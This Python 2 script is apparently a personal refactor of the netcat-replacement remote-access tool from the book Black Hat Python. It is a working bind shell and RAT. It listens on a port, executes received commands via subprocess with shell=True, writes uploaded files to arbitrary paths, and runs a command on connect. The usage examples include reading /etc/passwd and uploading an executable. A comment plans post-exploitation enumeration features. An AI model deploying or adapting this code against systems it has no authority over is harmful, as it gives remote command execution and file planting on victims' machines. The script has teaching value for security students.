#!/opt/local/bin/python2.7

#####################################################################################################################
#  Refactoring a RAT/netcat emulation script from the book Black Hat Python.
#  The code was a bit dirty so I'm changing a few things around. 
#  First thing done was to redesign a buggy socket.recv() call. 
#  Up next: 
#  1) Refactoring code:
#            i. remove reliance of functions on global vars, and instead call them with **kwargs/dicts
#            ii. add defaults to functions def headers to increase flexibility  #done 9/13/17
#  2) adding new features:
#            i.  local port forwarding/proxying
#            ii. post exploitation enumeration functions
#  3) Refactor code to replace the use of the `socket` and `threading` modules with twisted.
#     (Also consider select.select() [http://beej.us/guide/bgnet/].
#####################################################################################################################




import sys
import socket
import getopt
import threading
import subprocess
import os


# this runs a command and returns the output
def run_command(command):
    # trim the newline
    command = command.rstrip()

    # run the command and get the output back
    # must use os for directory changes
    try:

        if 'cd' not in command.split(" ")[0]:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)

        else:  # if we're running a cd, use os.chdir
            directory = (command.split(" ")[1])
            os.chdir(directory)
            output = os.getcwd()
            print output
    except:
        output = "Failed to execute command.\r\n"

    # send the output back to the client
    return output


# this handles incoming client connections
def client_handler(client_socket='', command='', execute='', upload_destination=''):
    print "upload destination is", upload_destination
    # check for upload
    if upload_destination:

        # read in all of the bytes and write to our destination
        file_buffer = ''

        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # now we take these bytes and try to write them out
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # check for command execution
    if execute:
        # run the command
        output = run_command(execute)

        client_socket.send(output)

    # now we go into another loop if a command shell was requested
    if command:

        while True:
            # show a simple prompt
            client_socket.send("<BHP:#> ")

            # now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # we have a valid command so execute it and send back the results
            response = run_command(cmd_buffer)

            # send back the response
            client_socket.send(str(response+"xxxXXXxxx"))


# this is for incoming connections
def server_loop(port='', execute='', command='', upload_destination='', target=''):

    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((target, port))
        server.listen(5)
        print 'server has successfully bound to %s %s' % (target, port)

    except socket.error as sock_error:
        print "failed to start server with error: ", sock_error

    while True:
        client_socket, addr = server.accept()
        # spin off a thread to handle our new client
        print 'creating new thread to handle clients'
        kwargs={'client_socket':client_socket,
                'upload_destination':upload_destination,
                'execute':execute,
                'command':command}
        client_thread = threading.Thread(target=client_handler, kwargs=kwargs)

        client_thread.start()


# if we don't listen we are a client....make it so.
def client_sender(buffer, target, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to our target host
        client.connect((target, port))
        print 'client connected to %s %s' % (target,port)
        # if we detect input from stdin send it
        # if not we are going to wait for the user to punch some in

        if len(buffer):
            client.send(buffer)

        while True:

            # now wait for data back
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if "xxxXXXxxx" or '<BHP:#>' in response:  # check for user defined delimiter
                    break

            print response,

            # wait for more input
            buffer = raw_input("")
            buffer += "\n"

            # send it off
            client.send(buffer)

    except socket.error as err:
        # just catch generic errors - you can do your homework to beef this up
        print "[*] Exception! Error Message:%s \tExiting." % err

        # teardown the connection
        client.close()


def usage():
    print "Netcat Replacement"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen                - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run   - execute the given file upon receiving a connection"
    print "-c --command               - initialize a command shell"
    print "-u --upload=destination    - upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)


def parse_and_execute():
    listen = False
    command = False
    execute = ""
    target = ""
    upload_destination = ""
    port = '0'

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # are we going to listen or just send data from stdin
    if not listen and len(target) and port > 0:
        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input
        # to stdin
        buffer = sys.stdin.read()

        # send data off
        client_sender(buffer, target, port)

        # we are going to listen and potentially
    # upload things, execute commands and drop a shell back
    # depending on our command line options above
    if listen:
        print "upload destination is ", upload_destination
        server_loop(port, execute, command, upload_destination, target)


def main():
    parse_and_execute()


main()
